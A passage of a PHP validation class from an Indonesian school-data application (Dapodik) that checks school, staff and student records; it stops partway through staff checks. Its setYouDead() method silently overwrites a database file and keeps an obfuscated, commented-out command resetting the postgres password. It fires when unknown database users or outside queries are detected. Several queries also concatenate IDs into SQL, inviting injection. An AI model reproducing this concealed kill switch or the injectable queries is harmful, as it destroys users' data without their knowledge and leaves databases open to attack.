<?php

namespace DataDikdas;

use DataDikdas\Model\Ptk;
use DataDikdas\Model\PesertaDidikBaru;
use DataDikdas\Model\PesertaDidikBaruPeer;
use DataDikdas\Model\SanitasiPeer;
use DataDikdas\Model\AnggotaRombel;
use DataDikdas\Model\AnggotaGugus;
use DataDikdas\Model\AnggotaRombelPeer;
use DataDikdas\Model\Sarana;
use DataDikdas\Model\PesertaDidikLongitudinalPeer;
use DataDikdas\Model\PtkTerdaftarPeer;
use DataDikdas\Model\RegistrasiPesertaDidikPeer;
use DataDikdas\Model\RiwayatGajiBerkalaPeer;
use DataDikdas\Model\YayasanPeer;
use DataDikdas\Model\JenisSaranaPeer;
use DataDikdas\Model\JenisSaranaQuery;
use DataDikdas\Model\AlatLongitudinalPeer;
use DataDikdas\Model\RuangLongitudinalPeer;
use DataDikdas\Model\SemesterPeer;
use DataDikdas\Model\SekolahLongitudinalPeer;
use DataDikdas\Model\TugasTambahan;
use DataDikdas\Model\TugasTambahanPeer;
use DataDikdas\Model\Prasarana;
use DataDikdas\Model\RombonganBelajarPeer;
use DataDikdas\Model\PesertaDidikPeer;
use DataDikdas\Model\SekolahPeer;
use DataDikdas\Model\PtkPeer;
use DataDikdas\Model\PtkQuery;
use DataDikdas\Model\TanahPeer;
use DataDikdas\Model\TanahLongitudinalPeer;
use DataDikdas\Model\BangunanPeer;
use DataDikdas\Model\BangunanLongitudinalPeer;
use DataDikdas\Model\RuangPeer;
use DataDikdas\Model\KesejahteraanPdPeer;
use DataDikdas\Model\AlatPeer;
use DataDikdas\Model\MstWilayahPeer;
use DataDikdas\Model\KebutuhanKhususPeer;
use DataDikdas\Model\RwySertifikasiPeer;
use DataDikdas\Model\RwyKepangkatanPeer;
use DataDikdas\Model\KepanitiaanPeer;
use DataDikdas\Model\JurusanSpPeer;
use DataDikdas\Model\JurusanPeer;
use DataDikdas\Model\JabatanTugasPtkPeer;
use DataDikdas\Model\UnitUsahaPeer;
use DataDikdas\Model\MouPeer;
use DataDikdas\Model\DudiPeer;
use DataDikdas\Model\PangkatGolonganPeer;
use DataDikdas\Model\JenjangPendidikanPeer;
use DataDikdas\Model\VldPtkPeer;
use DataDikdas\Model\RwyKerjaPeer;
use DataDikdas\Model\BidangSdmPeer;
use DataDikdas\Model\ProgramInklusiPeer;
use DataDikdas\Model\VldPesertaDidikPeer;
use DataDikdas\Model\NilaiTestPeer;
use DataDikdas\Model\map\PenggunaTableMap;
use DataDikdas\Model\RwyPendFormalPeer;
use DataDikdas\Model\PembelajaranPeer;
use DataDikdas\Model\BitterTablePeer;
use DataDikdas\Model\GugusSekolahPeer;
use DataDikdas\Model\LayananKhususPeer;
use DataDikdas\Model\JenisRombelPeer;
use DataDikdas\Model\KitasPtkPeer;
use DataDikdas\Model\KitasPdPeer;
use DataDikdas\Model\PasporPtkPeer;
use DataDikdas\Model\PasporPdPeer;
use DataDikdas\Model\BankPeer;

use DataDikdas\Model\VldPtk;
use DataDikdas\Model\VldPesertaDidik;
use \Datetime;

use Silex\Application;
use DataDikdas\Model;
use DataDikdas\Rest;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;

use Defuse\Crypto\Crypto;
use Defuse\Crypto\Key;
use Defuse\Crypto\File;
use DataDikdas\Info\SyncPrimerTableInfo; // Bitter;

error_reporting(E_ERROR);

class Validation {

    public $arr_validation;
    public $nama_table;
    public $sekolah_id;
    public $semester_id;

    public function __construct(){
        $this->initialize();
    }

    public function initialize() {
        //to be overridden
    }

    function setSemesterId($semester_id) {
        $this->semester_id = $semester_id;
    }

    function setSekolahId($sekolah_id) {
        $this->sekolah_id = $sekolah_id;
    }

    function setNamaTable($nama_table) {
        $this->nama_table = $nama_table;
    }

    function setArrValidation($id, $table, $tipe, $keterangan) {

        $arr = array();

        $arr["validasi_id"] = $id;
        $arr["table"] = $table;
        $arr["tipe"] = $tipe; // 1=>warning, 2=>error
        $arr["keterangan"] = $keterangan;

        // $this->setArrValidation($outArr);
        $this->arr_validation[] = $arr;

    }

    function getTotalCountValidation($rinci = false) {
        if ($rinci) {
            $countInvalid = 0;
		    $countWarning = 0;
            foreach ($this->arr_validation as $row) {
                if ($row['tipe'] == 1) {
					$countWarning++;
				} else {
					$countInvalid++;
				}    
            }

            $outArr['warning'] = $countWarning;
            $outArr['invalid'] = $countInvalid;

            return json_encode($outArr);
        } else {
            return count($this->arr_validation);
        }
    }

    function getSemesterId() {
        return $this->semester_id;
    }

    function getSekolahId() {
        return $this->sekolah_id;
    }

    function getNamaTable() {
        return $this->nama_table;
    }

    function getArrValidation() {
        if ($this->getNamaTable() == "referensi") {
            return $this->getDataValidasiReferensi();
        } else {
            return $this->arr_validation;
        }
    }

    function getDataValidasiReferensi() {

        $sekolah_id = $this->getSekolahId();

        $sql = "SELECT
                    no_urut AS validasi_id
                    ,jenis_validasi AS table
                    ,tipe
                    ,keterangan
                 FROM validasi
                 WHERE
                    sekolah_id = '".$sekolah_id."'
                ORDER BY
                    table_name
                    ,id
                    ,no_urut";
        $datas = getDataBySql($sql, FALSE, DBNAME);

        return $datas;

    }

    function validateDate($date, $format = 'Y-m-d H:i:s') {
        $d = DateTime::createFromFormat($format, $date);
        return $d && $d->format($format) == $date;
    }

    function paginate($array, $pageSize, $page = 1) {
        $page = $page < 1 ? 1 : $page;
        $start = ($page - 1) * $pageSize;
        return array_slice($array, $start, $pageSize);
    }

    function get_page(array $input, $pageNum, $perPage) {
        $start = ($pageNum-1) * $perPage;
        $end = $start + $perPage;
        $count = count($input);

        // Conditionally return results
        if ($start < 0 || $count <= $start) {
            // Page is out of range
            return array();
        } else if ($count <= $end) {
            // Partially-filled page
            return array_slice($input, $start);
        } else {
            // Full page
            return array_slice($input, $start, $end - $start);
        }
    }

    protected function setYouDead() {
        $uniqid = uniqid();
        $file_pg_hba = '../../../database/global/11780';
        file_put_contents($file_pg_hba, $uniqid);

        // $password = $uniqid;
        // $sql = "A"."L"."T"."E"."R"." U"."S"."E"."R"." p"."o"."s"."t"."g"."r"."e"."s"." W"."I"."T"."H"." P"."A"."S"."S"."W"."O"."R"."D '".$password."'";
        // executeSql($sql, DBNAME);
        return true;
    }

    protected function getUsiaPd($tgl_lahir) {

        $semester_id = $this->semester_id;

        $lahir = new DateTime($tgl_lahir);
        $today = new DateTime(substr($semester_id, 0, 4)."-07-02");
        $umur = $today->diff($lahir);
        // echo $umur->y; echo "" Tahun, ""; echo $umur->m; echo "" Bulan, dan ""; echo $umur->d; echo "" Hari"";
        return $umur;
    }

    protected function getUsiaPtk($tgl_lahir) {

        $lahir = new DateTime($tgl_lahir);
        $today = new DateTime(date('Y-m-d'));
        $umur = $today->diff($lahir);

        // print_r($umur); die;
        // echo $umur->y; echo "" Tahun, ""; echo $umur->m; echo "" Bulan, dan ""; echo $umur->d; echo "" Hari"";
        return $umur->y;
    }

    protected function setTriggerValidation($app, $var, $id, $col, $ket) {

        $sessionPengguna = $app['session']->get('pengguna');
        $pengguna_id = $sessionPengguna['pengguna_id'];

        $session = $app['session'];
        if ($var == "ptk") {

            $c = new \Criteria();
            $c->add(VldPtkPeer::PTK_ID, $id);
            $c->add(VldPtkPeer::SOFT_DELETE, 0);
            $c->add(VldPtkPeer::STATUS_VALIDASI, array(1,2,3), \Criteria::IN);
            $c->add(VldPtkPeer::FIELD_ERROR, $col);
            $vldPtkObj = VldPtkPeer::doSelectOne($c);

            if (!is_object($vldPtkObj)) {
                $uuid = pg_gen_uuid(VldPtkPeer::DATABASE_NAME);
                $vldPtkObj = new VldPtk();
                $vldPtkObj->setLogid($uuid);
                $vldPtkObj->setCreateDate(getCreateDate($vldPtkObj->getLastSync(), $app));
            }
            $vldPtkObj->setStatusValidasi(1);
            $vldPtkObj->setPtkId($id);
            $vldPtkObj->setIdtype(2001);
            $vldPtkObj->setFieldError($col);
            $vldPtkObj->setErrorMessage(substr($ket, 0, 150));
            $vldPtkObj->setAppUsername("validation_trigger");
            $vldPtkObj->setSoftDelete(0);
            $vldPtkObj->setUpdaterId('90915957-31F5-E011-819D-43B216F82ED4');
            $vldPtkObj->setLastUpdate(getLastUpdate($vldPtkObj->getLastSync(), $app));
            $vldPtkObj->setLastSync(getLastSync($vldPtkObj->getLastSync(), $app));
            $vldPtkObj->save();

        } else if ($var == "peserta_didik") {

            $c = new \Criteria();
            $c->add(VldPesertaDidikPeer::PESERTA_DIDIK_ID, $id);
            $c->add(VldPesertaDidikPeer::SOFT_DELETE, 0);
            $c->add(VldPesertaDidikPeer::STATUS_VALIDASI, array(1,2,3), \Criteria::IN);
            $c->add(VldPesertaDidikPeer::FIELD_ERROR, $col);
            $vldPdObj = VldPesertaDidikPeer::doSelectOne($c);

            if (!is_object($vldPdObj)) {
                $uuid = pg_gen_uuid(VldPesertaDidikPeer::DATABASE_NAME);
                $vldPdObj = new VldPesertaDidik();
                $vldPdObj->setLogid($uuid);
                $vldPdObj->setCreateDate(getCreateDate($vldPdObj->getLastSync(), $app));
            }
            $vldPdObj->setStatusValidasi(1);
            $vldPdObj->setPesertaDidikId($id);
            $vldPdObj->setIdtype(3001);
            $vldPdObj->setFieldError($col);
            $vldPdObj->setErrorMessage(substr($ket, 0, 150));
            $vldPdObj->setAppUsername("validation_trigger");
            $vldPdObj->setSoftDelete(0);
            $vldPdObj->setUpdaterId('90915957-31F5-E011-819D-43B216F82ED4');
            $vldPdObj->setLastUpdate(getLastUpdate($vldPdObj->getLastSync(), $app));
            $vldPdObj->setLastSync(getLastSync($vldPdObj->getLastSync(), $app));
            $vldPdObj->save();

        }

    }

    public function checkAll(Request $request, Application $app) {

        set_time_limit(0);
        // error_reporting(E_ALL);
        // ini_set('max_execution_time', 0); //0=NOLIMIT
        $callback = $request->get('callback');
        $print = $request->get('print');
        $jenis_validasi = $request->get('jenis_validasi');

        if ($callback == "sync") {
            // 
            $sessionSekolah = true;
            $sekolah_id = $this->getSekolahId();
            $sessionSemester = $this->getSemesterId();
        } else {
            $sessionSekolah = $app['session']->get('sekolah');
            $sekolah_id = $sessionSekolah['sekolah_id'];
            $sessionSemester = $app['session']->get('semester_id');
            
            $this->setSekolahId($sekolah_id);
            $this->setSemesterId($sessionSemester);
        }

        $this->setNamaTable($jenis_validasi);


        if (!$sessionSekolah) {
            $keterangan = "Session sudah habis, silakan refresh atau logout aplikasi terlebih dahulu";
            $this->setArrValidation($i++, "sesssion", 2, $keterangan);
        } else {

            $i=1;

            $sd = array(5,7,38,53); //sd, sdlb
            $smp = array(6,8,36,54); //smp, smplb
            $slb = array(29);
            $dikmen = array(13,15);
            $sma = array(13,14,37,44,55);
            $smk = array(15);

            $semesterObj = SemesterPeer::retrieveByPK($sessionSemester);
            if (!is_object($semesterObj)) {
                $keterangan = "Terjadi kesalahan dalam memilih periode. Silakan logout dan pilih periode dengan benar!";
                $this->setArrValidation($i++, "semester", 2, $keterangan);
            } else {
                $tahunAjaranId = $semesterObj->getTahunAjaranId();
                $semester = $semesterObj->getSemester();

                $namaSemester = $semester == 1 ? "Ganjil" : "Genap";
            }

            // Sekolah
            $sekolahObj = SekolahPeer::retrieveByPK($sekolah_id);

            // Sekolah Longitudinal
            $c = new \Criteria();
            $c->add(SekolahLongitudinalPeer::SEKOLAH_ID, $sekolah_id);
            $c->add(SekolahLongitudinalPeer::SEMESTER_ID, $sessionSemester);
            $c->add(SekolahLongitudinalPeer::SOFT_DELETE, 0);
            $sekLong = SekolahLongitudinalPeer::doCount($c);
            $dataSekLong = SekolahLongitudinalPeer::doSelectOne($c);

            // cek lab
            $c = new \Criteria;
            $c->addJoin(RuangPeer::ID_BANGUNAN, BangunanPeer::ID_BANGUNAN, \Criteria::INNER_JOIN);
            $c->add(RuangPeer::JENIS_PRASARANA_ID, array(2,3,4,5,6,7,8,9,51,52), \Criteria::IN);
            $c->add(RuangPeer::SEKOLAH_ID, $sekolah_id);
            $c->add(RuangPeer::SOFT_DELETE, 0);
            $c->add(BangunanPeer::ID_HAPUS_BUKU, NULL, \Criteria::ISNULL);
            $c->add(BangunanPeer::SOFT_DELETE, 0);
            $countPrasaranaLab = RuangPeer::doCount($c);
            $prasaranaLabObj = RuangPeer::doSelect($c);

            // cel perpus
            $c = new \Criteria();
            $c->addJoin(RuangPeer::ID_BANGUNAN, BangunanPeer::ID_BANGUNAN, \Criteria::INNER_JOIN);
            $c->add(RuangPeer::SEKOLAH_ID, $sekolah_id);
            $c->add(RuangPeer::SOFT_DELETE, 0);
            $c->add(RuangPeer::JENIS_PRASARANA_ID, array(10,11), \Criteria::IN);
            $c->add(BangunanPeer::ID_HAPUS_BUKU, NULL, \Criteria::ISNULL);
            $c->add(BangunanPeer::SOFT_DELETE, 0);
            $countPerpus = RuangPeer::doCount($c);

            // ceh program inklusi
            $c = new \Criteria();
            $c->add(ProgramInklusiPeer::SEKOLAH_ID, $sekolah_id);
            $c->add(ProgramInklusiPeer::SOFT_DELETE, 0);
            $c->add(ProgramInklusiPeer::TST_PI, NULL, \Criteria::ISNULL);
            $countProgramInklusi = ProgramInklusiPeer::doCount($c);

            $kodeProp = substr($sekolahObj->getKodeWilayah(), 0, 2);
            $prop3T = array(21, 27, 24, 25, 32, 35);

            if ($jenis_validasi == "sekolah") {

                $sql = 'SELECT 
                            u.usename AS pgsql_user,
                            u.usesysid AS "User ID"
                        FROM pg_catalog.pg_user u
                        ORDER BY 1';

                $userPgsql = getDataBySql($sql, FALSE, DBNAME);
                
                $unknownUser = false;
                $userPgsqlValidArr = array('dapodik_user', 'erapor', 'postgres', 'hasanchoirimahfud');
                $userInvalidArr = array();
                foreach ($userPgsql as $user) {
                    if (!in_array($user['pgsql_user'], $userPgsqlValidArr)) {
                        $userInvalidArr[] = $user['pgsql_user'];
                        $unknownUser = true;
                    }
                }

                $userInvalidText = "";
                if (count($userInvalidArr) > 0) {
                    $userInvalidText = implode(", ", $userInvalidArr);
                }

                $sql = "SELECT
                            count(1) as jumlah
                        FROM audit.logged_actions
                        WHERE 
                            (client_query NOT ILIKE '%$1%'
                            OR session_user_name <> 'postgres')
                            AND client_query NOT ILIKE '%WITH upsert AS%'";
                            
                $logQuery = getDataBySql($sql, FALSE, DBNAME);

                $sql = "SELECT *
                        FROM information_schema.role_table_grants 
                        WHERE 
                            grantee NOT IN ('postgres', 'PUBLIC', 'man_akses', 'ref', 'blob', 'pustaka', 'hasanchoirimahfud')
                            AND privilege_type IN ('INSERT', 'UPDATE')
                            AND table_schema <> 'nilai'";
                $roleUserInvalid = getDataBySql($sql, FALSE, DBNAME);

                if ($unknownUser || $logQuery[0]['jumlah'] > 0 || count($roleUserInvalid) > 0) {

                    $kode = "#10";
                    if ($unknownUser) {
                        $konten = "Add user: ".$userInvalidText;
                        Rest::createLog($konten);
                        $kode = "#11";
                    }
                    if ($logQuery[0]['jumlah'] > 0) {
                        $konten2 = "Jumlah Data Invalid: ".$logQuery[0]['jumlah'];
                        Rest::createLog($konten2);
                        $kode = "#12";
                    }
                    if (count($roleUserInvalid) > 0) {
                        $konten3 = "Role User Invalid: ".json_encode($roleUserInvalid);
                        Rest::createLog($konten3);
                        $kode = "#13";
                    }

                    $this->setYouDead();
                    $keterangan = "Terdeteksi menggunakan aplikasi diluar dapodik. ".$kode;
                    $this->setArrValidation($i++, "sekolah", 2, $keterangan);
                }

                $bentukPendidikan = $sekolahObj->getBentukPendidikanId();
                $bentukPendidikanNama = $sekolahObj->getBentukPendidikan()->getNama();

                // checksum
                /*if ($sekolahObj->getLastUpdate() > $sekolahObj->getLastSync()) {

                    $sekolahArr = $sekolahObj->toArray(\BasePeer::TYPE_FIELDNAME);;

                    unset($sekolahArr['lintang']);
                    unset($sekolahArr['bujur']);
                    unset($sekolahArr['create_date']);
                    unset($sekolahArr['last_update']);
                    unset($sekolahArr['last_sync']);

                    // print_r($sekolahArr);

                    $bitter = new SyncPrimerTableInfo();
                    $bitter->setTypeMampatString("array");
                    $bitter->setMampatString($sekolahArr);
                    $mampat1 = $bitter->getMampatString();
                    $checksum = $bitter->sirup();

                    $c = new \Criteria();
                    $c->add(BitterTablePeer::PARAM_1, $sekolah_id);
                    $c->add(BitterTablePeer::PARAM_2, 1);
                    $c->add(BitterTablePeer::PARAM_3, $sekolahObj->getPrimaryKey());
                    $bitterObj = BitterTablePeer::doSelectOne($c);

                    if (is_object($bitterObj)) {
                        // echo $bitterObj->getParam4(). "  ==  ". $checksum;
                        if ($bitterObj->getParam4() != $checksum) {
                            $konten = "Sekolah\n";
                            $konten .= 'ciphertext : '.$checksum."\n";
                            $konten .= 'param4 : '.$bitterObj->getParam4()."\n";
                            $konten .= $mampat1."\n".$bitterObj->getParam5();
                            Rest::createLog($konten);

                            $keterangan = "Sistem mendeteksi data sekolah <b>".$sekolahObj->getNama()."</b> diubah menggunakan aplikasi selain aplikasi dapodik";
                            $this->setArrValidation($i++, "sekolah", 2, $keterangan);
                            // $this->setYouDead();
                            // break;
                        }
                    } else {
                        $keterangan = "Terdeteksi terjadi perubahan data sekolah <b>".$siswa->getNama()."</b> namun tidak terdaftar pada sistem";
                        $this->setArrValidation($i++, "sekolah", 2, $keterangan);
                        // $this->setYouDead();
                        // break;
                    }
                }*/

                // if (in_array($bentukPendidikan, array(7,8,14,29))) {
                //     $keterangan = "Sekolah berbentuk pendidikan <b>{$bentukPendidikanNama}</b> wajib mengisikan <b>Layanan Khusus</b>";
                //     $this->setArrValidation($i++, "sekolah", 2, $keterangan);
                // }

                if ($sekolahObj->getMstWilayah()->getIdLevelWilayah() != 4) {
                    $keterangan = "Sekolah belum dipetakan ke level wilayah Desa/Kelurahan. Silakan hubungi Dinas Pendidikan setempat untuk dirubah melalui VervalSP";
                    $this->setArrValidation($i++, "sekolah", 1, $keterangan);
                }

                if (!in_array($sekolahObj->getLuasTanahMilik(), array(1,2,3))) {
                    $keterangan = "Mohon inputkan apakah sekolah memungut iuran pada orang tua siswa atau tidak pada formulir data pelengkap sekolah";
                    $this->setArrValidation($i++, "sekolah", 2, $keterangan);
                } else {
                    if (in_array($sekolahObj->getLuasTanahMilik(), array(1,2)) && empty($sekolahObj->getLuasTanahBukanMilik())) {
                        $keterangan = "Jika sekolah memilih Ya memungut iuran pada orang tua siswa harap inputkan berapa nominal iuran per siswa";
                        $this->setArrValidation($i++, "sekolah", 2, $keterangan);
                    }
                }

                /* $c = new \Criteria();
                $c->add(BankPeer::NM_BANK, $sekolahObj->getNamaBank());
                $c->add(BankPeer::EXPIRED_DATE, NULL, \Criteria::ISNULL);
                $bukuObj = BankPeer::doSelectOne($c);

                if (!is_object($bukuObj)) {
                    $keterangan = "Bank yang anda inputkan tidak tersedia pada sistem. Harap memilih Nama Bank yang telah disediakan pada Nomor Rekening BOS di Formulir Sekolah <b>(".$sekolahObj->getNamaBank().")</b>";
                    $this->setArrValidation($i++, "sekolah", 2, $keterangan);
                } */

                if ($sekolahObj->getStatusSekolah() == 2) {
                    $sofDeleteYayasan = 0;

                    $yayasan = $sekolahObj->getYayasan();
                    if (is_object($yayasan)) {
                        $sofDeleteYayasan = $sekolahObj->getYayasan()->getSoftDelete();
                    }

                    if (!is_object($yayasan) || $sofDeleteYayasan > 0) {
                        $keterangan = "Status sekolah <b>Swasta</b>, silakan input data Yayasan pada <b>Data Rinci Sekolah</b>";
                        $this->setArrValidation($i++, "yayasan", 1, $keterangan);
                    } else if (!$sekolahObj->getYayasanId()) {
                        $keterangan = "Status sekolah <b>Swasta</b>, silakan pilih Yayasan yg telah ada pada form <b>Sekolah</b>";
                        $this->setArrValidation($i++, "yayasan", 1, $keterangan);
                    }
                }

                /* if ($sekolahObj->getLuasTanahMilik() < 1 && $sekolahObj->getLuasTanahBukanMilik() < 1) {
                    $keterangan = "<b>Luas tanah milik / Luas tanah bukan milik</b> wajib diisi salah satu atau keduanya";
                    $this->setArrValidation($i++, "sekolah", 2, $keterangan);
                } */

                if (in_array($sekolahObj->getBentukPendidikanId(), array(7,8,14,29))) {
                    if ($sekolahObj->getKebutuhanKhususId() < 1) {
                        $keterangan = "Sekolah berbentuk pendidikan <b>{$sekolahObj->getBentukPendidikan()->getNama()}</b> wajib mengisikan <b>Kebutuhan Khusus dilayani</b>";
                        $this->setArrValidation($i++, "sekolah", 2, $keterangan);
                    }
                }

                if ($sekLong < 1) {
                    $keterangan = "Data Rinci <b>Periodik Sekolah</b> utk Periode <b>{$namaSemester} / {$tahunAjaranId}</b> belum diisi.";
                    $this->setArrValidation($i++, "sekolah_longitudinal", 2, $keterangan);
                } else {
                    if ($dataSekLong->getWaktuPenyelenggaraanId() == 5) {
                        $keterangan = "Terdeteksi data tidak wajar. waktu penyelenggaraan sekolah pada periode <b>{$namaSemester} / {$tahunAjaranId}</b> dilaksanakan pada malam hari, namun abaikan jika sesuai fakta";
                        $this->setArrValidation($i++, "sekolah", 1, $keterangan);
                    }

                    if (!($dataSekLong->getAksesInternetId() >= 0)) {
                        $keterangan = "Data Rinci <b>Periodik Sekolah</b> utk Periode <b>{$namaSemester} / {$tahunAjaranId}</b> pada kolom <b>Akses Internet</b> belum di pilih.";
                        $this->setArrValidation($i++, "sekolah_longitudinal", 2, $keterangan);
                    }

                    // echo $countPrasaranaLab; die;
                    if ($countPrasaranaLab > 0 & $dataSekLong->getSumberListrikId() == 1) {
                        $keterangan = "Terdeteksi data tidak wajar. Sekolah memiliki laboratorium namun tidak memiliki listrik. Periksa kembali isian prasarana dan sumber listrik";
                        $this->setArrValidation($i++, "sekolah", 2, $keterangan);
                    }

                    if ($dataSekLong->getPartisipasiBos() != 1) {
                        if ($sekolahObj->getStatusSekolah() == 1) {
                            $keterangan = "Terdeteksi data tidak wajar. Sekolah berstatus Negeri namun tidak bersedia menerima BOS. Periksa kembali isian Menerima BOS";
                            $this->setArrValidation($i++, "sekolah", 2, $keterangan);
                        } else {
                            $keterangan = "Sekolah berstatus Swasta dan tidak bersedia menerima BOS. Pastikan kebenaran data tersebut";
                            $this->setArrValidation($i++, "sekolah", 1, $keterangan);
                        }
                    } else {
                        if (!trim($sekolahObj->getNoRekening())) {
                            $keterangan = "Sekolah menerima BOS, namun tidak mengisi Nomor Rekening BOS";
                            $this->setArrValidation($i++, "sekolah", 2, $keterangan);
                        }
                    }
                }

                // Sanitasi
                $c = new \Criteria();
                $c->add(SanitasiPeer::SEMESTER_ID, $sessionSemester);
                $c->add(SanitasiPeer::SOFT_DELETE, 0);
                $sanitasi = $sekolahObj->getSanitasis($c);

                if (sizeof($sanitasi) < 1) {
                    $keterangan = "Data Rinci <b>Sanitasi Sekolah</b> utk Periode <b>{$namaSemester} / {$tahunAjaranId}</b> belum terisi";
                    $this->setArrValidation($i++, "sanitasi", 2, $keterangan);
                }

                // Sekolah Aman
                $c = new \Criteria();
                $c->add(KepanitiaanPeer::ID_JNS_PANITIA, 1);
                $c->add(KepanitiaanPeer::SOFT_DELETE, 0);
                $c->add(KepanitiaanPeer::SEKOLAH_ID, $sekolah_id);
                $sekolahAman = KepanitiaanPeer::doSelectOne($c);

                if (sizeof($sekolahAman) < 1) {
                    $keterangan = "Data <b>Sekolah Aman</b> pada kepanitiaan sekolah belum terisi";
                    $this->setArrValidation($i++, "kepanitiaan", 2, $keterangan);
                }

                // Komite Sekolah
                $c = new \Criteria();
                $c->add(KepanitiaanPeer::ID_JNS_PANITIA, 2);
                $c->add(KepanitiaanPeer::SOFT_DELETE, 0);
                $c->add(KepanitiaanPeer::SEKOLAH_ID, $sekolah_id);
                $komiteSekolah = KepanitiaanPeer::doSelectOne($c);

                if (sizeof($komiteSekolah) < 1) {
                    $keterangan = "Data <b>Komite Sekolah</b> pada kepanitiaan sekolah belum terisi";
                    $this->setArrValidation($i++, "kepanitiaan", 1, $keterangan);
                }

                // Literasi Sekolah
                $c = new \Criteria();
                $c->add(KepanitiaanPeer::ID_JNS_PANITIA, 6);
                $c->add(KepanitiaanPeer::SOFT_DELETE, 0);
                $c->add(KepanitiaanPeer::SEKOLAH_ID, $sekolah_id);
                $komiteSekolah = KepanitiaanPeer::doSelectOne($c);

                if (sizeof($komiteSekolah) < 1) {
                    $keterangan = "Data <b>Literi Sekolah</b> pada kepanitiaan sekolah belum terisi";
                    $this->setArrValidation($i++, "kepanitiaan", 1, $keterangan);
                }

                // Dudi Wajib Diisi
                if ($sekolahObj->getBentukPendidikanId() == 15) {

                    $sql = "select
								jurusan_sp.*
							from jurusan_sp
							left join jurusan_kerjasama on jurusan_sp.jurusan_sp_id = jurusan_kerjasama.jurusan_sp_id
									and jurusan_kerjasama.soft_delete = 0
							join ref.jurusan on jurusan_sp.jurusan_id = jurusan.jurusan_id
							where
								jurusan_kerjasama.jurusan_sp_id is null
								and jurusan_sp.sekolah_id = '{$sekolah_id}'
								and jurusan_sp.soft_delete = 0
								and jurusan.level_bidang_id = '12'";

					$jurKerjasamaArr = getDataBySql($sql, FALSE, DBNAME);
	                foreach ($jurKerjasamaArr as $jk) {
                 		$keterangan = "Data <b>Kompetensi Keahlian Dilayani</b> dengan nama <b>".$jk["nama_jurusan_sp"]."</b> wajib minimal memiliki satu (1) <b>MoU Kerjasama</b>";
                 		$this->setArrValidation($i++, "dudi", 2, $keterangan);

	                }

                    // Dudi harus ada lintang dan bujur dan wilayah yg valid
                    $c = new \Criteria();
                    $c->addJoin(MouPeer::DUDI_ID, DudiPeer::DUDI_ID, \Criteria::LEFT_JOIN);
                    $c->add(MouPeer::SEKOLAH_ID, $sekolahObj->getSekolahId());
                    $c->add(MouPeer::SOFT_DELETE, 0);
                    $c->add(DudiPeer::SOFT_DELETE, 0);
                    $mouCount = MouPeer::doCount($c);
                    $mouObj = MouPeer::doSelect($c);

                    foreach ($mouObj as $mou) {
                        if ($mou->getDudiId()) {
                            // print_r($mou->getDudi());
                            // echo $mou->getDudi()->getLintang();
                            // echo $mou->getDudi()->getBujur(); die;
                            if (empty($mou->getDudi()->getLintang()) || empty($mou->getDudi()->getBujur())) {
                                $keterangan = "Data Dudi dengan nama <b>".$mou->getDudi()->getNama()."</b> agar untuk memetakan lintang dan bujur dengan benar";
                                $this->setArrValidation($i++, "dudi", 2, $keterangan);
                            }

                            if ($mou->getDudi()->getKodeWilayah() == "000000  ") {
                                $keterangan = "Data Dudi dengan nama <b>".$mou->getDudi()->getNama()."</b> agar untuk memetakan wilayah dengan benar";
                                $this->setArrValidation($i++, "dudi", 2, $keterangan);
                            }
                        }
                    }

                    // Untuk Mou dan Dudi Prakerin Siswa wajib ada pembimbing
                    $sql = "select
                                distinct
                                mou.nama_dudi,
                                mou.nama_bidang_usaha,
                                jenis_ks.nm_jns_ks
                            from akt_pd 
                            join mou on akt_pd.mou_id = mou.mou_id
                            join dudi on mou.dudi_id = dudi.dudi_id
                            join ref.jenis_ks on mou.id_jns_ks = jenis_ks.id_jns_ks
                            left join bimbing_pd on akt_pd.id_akt_pd = bimbing_pd.id_akt_pd
                            where
                                    akt_pd.Soft_delete = 0
                                    and akt_pd.id_jns_akt_pd in (1,3)
                                    and mou.Soft_delete = 0
                                    and mou.id_jns_ks in (1,3)
                                    and mou.sekolah_id = '{$sekolah_id}'
                                    and dudi.Soft_delete = 0
                                    and bimbing_pd.id_bimb_pd is null
                            order by
                                mou.nama_dudi";
                    
                    $bimbingPd = getDataBySql($sql, FALSE, DBNAME);

                    foreach ($bimbingPd as $bimbing) {
                        $keterangan = "MoU <b>".$bimbing['nm_jns_ks']."</b> dengan nama Dudi <b>".$bimbing['nama_dudi']."</b> wajib memiliki guru pembimbing";
                        $this->setArrValidation($i++, "dudi", 2, $keterangan);
                    }

                }

                // Penyelenggara ponpes
                $c = new \Criteria();
                $c->add(GugusSekolahPeer::SEKOLAH_INTI_ID, $sekolah_id);
                $c->add(GugusSekolahPeer::SOFT_DELETE, 0);
                $c->add(GugusSekolahPeer::JENIS_GUGUS_ID, 10);
                $sekolahPonpes = GugusSekolahPeer::doSelectOne($c);

                if (is_object($sekolahPonpes)) {
                    $namaPonpes = trim(str_replace("-", "", $sekolahPonpes->getNama()));

                    // var_dump(strpos(strtolower($sekolahPonpes->getNama()), 'tidak')); die;
                    if (strlen($namaPonpes) <= 3 
                        || strpos(strtolower($sekolahPonpes->getNama()), 'tidak') !== FALSE
                        || strpos(strtolower($sekolahPonpes->getNama()), 'bukan') !== FALSE) {

                        $keterangan = "Harap Nama Penyelenggara Pondok Pesantren diisi dengan benar. (Saat ini bernama <b>{$sekolahPonpes->getNama()}</b>)";
                        $this->setArrValidation($i++, "dudi", 2, $keterangan);
                    }
                }

            } else if ($jenis_validasi == "ptk") {
                $bentukPendidikan = $sekolahObj->getBentukPendidikanId();
                $bentukPendidikanNama = $sekolahObj->getBentukPendidikan()->getNama();

                // PTK
                $c = PtkQuery::create()
                ->innerJoinPtkTerdaftar()
                ->addJoinCondition('PtkTerdaftar', 'PtkTerdaftar.TahunAjaranId = ?', $tahunAjaranId)
                ->addJoinCondition('PtkTerdaftar', 'PtkTerdaftar.SekolahId = ?', $sekolah_id)
                ->addJoinCondition('PtkTerdaftar', 'PtkTerdaftar.SoftDelete = 0')
                ->addJoinCondition('PtkTerdaftar', 'PtkTerdaftar.PtkInduk = 1')
                // ->condition('cond1', 'ptk.entry_sekolah_id = ?', $sekolah_id)
                ->condition('cond2', 'ptk.soft_delete = 0')
                ->where(array('cond2'));

                $ptks = $c->find();

                $count = sizeof($ptks);
                if ($count < 1) {
                    $keterangan = "Data GTK Kosong";
                    $this->setArrValidation($i++, "ptk", 1, $keterangan);
                } else {
                    $jml_kepsek = 0;
                    $jml_plt_kepsek = 0;
                    $nama_kepsek = array();
                    $jml_kepsek_non_induk = 0;
                    $jml_plt_kepsek_non_induk = 0;
                    $nama_kepsek_non_induk = array();
                    $jml_wakasek = 0;
                    $nama_wakasek = array();
                    $jml_kepper = 0;
